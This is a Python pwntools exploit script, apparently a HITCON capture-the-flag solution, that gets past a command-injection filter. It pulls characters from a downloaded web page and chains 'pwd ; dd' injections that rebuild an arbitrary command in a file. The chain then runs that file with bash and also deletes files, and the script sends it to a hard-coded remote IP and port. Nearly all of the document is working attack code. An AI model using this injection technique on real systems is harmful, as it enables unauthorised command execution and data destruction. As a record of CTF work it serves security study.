import pwn
import sys
import subprocess
import os.path

assert len(sys.argv) >= 2
cmd = sys.argv[1]  # The command we want to execute (will be saved to file)

url = 'hitcon.org'
wget = 'wget {}'.format(url)

if os.path.isfile('index.html'):
    os.remove('index.html')

print(subprocess.check_output(wget, shell=True).decode())

# Need to split into bytes to ensure multi-byte chars are handled correctly
fin = bytearray(open('index.html').read().encode())

payloads = [
    'pwd ; rm index.html',
    'pwd ; rm payload',
    'pwd ; {}'.format(wget)
]

# bs=1 -> blocksize = 1 byte
# count=1 -> transfer 1 block
# skip -> offset of the input file to read from
# seek -> offset of the output file to write to
fstr = 'pwd ; dd if=index.html of=payload bs=1 count=1 skip={} seek={}'

for i, c in enumerate(cmd):
    pos = fin.find(c.encode())
    if pos == -1:
        raise ValueError('char `{}` not found'.format(c))
    payloads.append(fstr.format(pos, i))

payloads.append('pwd ; bash payload')

p = '\n'.join(payloads)
print(p)

if len(sys.argv) >= 3:
    io = pwn.remote('54.248.135.16', 1986)
    io.sendline(p)
    print(io.recvallS(timeout=2))
else:
    print(subprocess.check_output(p, shell=True).decode())
